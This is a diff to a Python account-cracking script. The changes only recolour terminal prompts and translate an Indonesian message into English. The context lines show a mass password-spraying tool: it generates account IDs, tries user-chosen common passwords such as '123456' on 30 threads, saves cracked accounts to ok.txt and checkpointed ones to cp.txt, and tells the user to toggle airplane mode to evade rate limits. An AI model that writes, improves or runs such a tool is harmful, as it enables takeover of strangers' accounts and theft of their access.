@@ -69,7 +69,7 @@ class Main:
 				print("\n [!] CHOOSE ANY PASSWARD EXAMPLE : 123456,123456789")
 				listpass = input(" [?] PASSWARD YOU CHOOSE : ")
 				if len(listpass)<=5:
-					exit("\n [!] kata sandi minimal 6 karakter")
+					exit("\n \033[0;91m[!]\033[0;97m PASS MUST BE 6 DIGITS")
 				print(" [*] PASSWARD START CRACK -> [\033[0;91m%s\033[0;97m]"%(listpass))
 				print("\n [+] ACOUNT OK SAVE -> ok.txt")
 				print(" [+] ACOUNT CP SAVE -> cp.txt")
@@ -91,14 +91,14 @@ class Main:
 				self.id.append(__+str(_))
 			print(" \033[0;91m[+]\033[0;97m TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n [!] CHOOSE ANY PASSWARD EXAMPLE : 123456,123456789")
-				listpass = input(" [?] PASSWARD YOU CHOOSE : ")
+				print("\n \033[0;91m[!]\033[0;97m CHOOSE ANY PASSWARD EXAMPLE : 123456,123456789")
+				listpass = input(" \033[0;91m[?]\033[0;97m PASSWARD YOU CHOOSE : ")
 				if len(listpass)<=5:
-					exit("\n [!] kata sandi minimal 6 karakter")
-				print(" [*] PASSWARD START CRACK -> [\033[0;91m%s\033[0;97m]"%(listpass))
-				print("\n [+] ACOUNT OK SAVE -> ok.txt")
-				print(" [+] ACOUNT CP SAVE -> cp.txt")
-				print(" [!] TURN ON AIRPLANE MODE FOR (5 Sec )\n")
+					exit("\n \033[0;91m[!]\033[0;97m PASS MUST BE 6 DIGITS")
+				print(" \033[0;91m[*]\033[0;97m PASSWARD START CRACK -> [\033[0;91m%s\033[0;97m]"%(listpass))
+				print("\n \033[0;91m[+]\033[0;97m ACOUNT OK SAVE -> ok.txt")
+				print(" \033[0;91m[+]\033[0;97m ACOUNT CP SAVE -> cp.txt")
+				print(" \033[0;91m[!]\033[0;97m TURN ON AIRPLANE MODE FOR (5 Sec )\n")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n [#] crack selesai...")
@@ -116,14 +116,14 @@ class Main:
 				self.id.append(__+str(_))
 			print(" \033[0;91m[+]\033[0;97m TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n [!] CHOOSE ANY PASSWARD EXAMPLE : 123456,123456789")
-				listpass = input(" [?] PASSWARD YOU CHOOSE : ")
+				print("\n \033[0;91m[!]\033[0;97m CHOOSE ANY PASSWARD EXAMPLE : 123456,123456789")
+				listpass = input(" \033[0;91m[?]\033[0;97m PASSWARD YOU CHOOSE : ")
 				if len(listpass)<=5:
-					exit("\n [!] kata sandi minimal 6 karakter")
-				print(" [*] PASSWARD START CRACK -> [\033[0;91m%s\033[0;97m]"%(listpass))
-				print("\n [+] ACOUNT OK SAVE -> ok.txt")
-				print(" [+] ACOUNT CP SAVE -> cp.txt")
-				print(" [!] TURN ON AIRPLANE MODE FOR (5 Sec )\n")
+					exit("\n \033[0;91m[!]\033[0;97m PASS MUST BE 6 DIGITS")
+				print(" \033[0;91m[*]\033[0;97m PASSWARD START CRACK -> [\033[0;91m%s\033[0;97m]"%(listpass))
+				print("\n \033[0;91m[+]\033[0;97m ACOUNT OK SAVE -> ok.txt")
+				print(" \033[0;91m[+]\033[0;97m ACOUNT CP SAVE -> cp.txt")
+				print(" \033[0;91m[!]\033[0;97m TURN ON AIRPLANE MODE FOR (5 Sec )\n")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
 			exit("\n\n [#] crack selesai...")
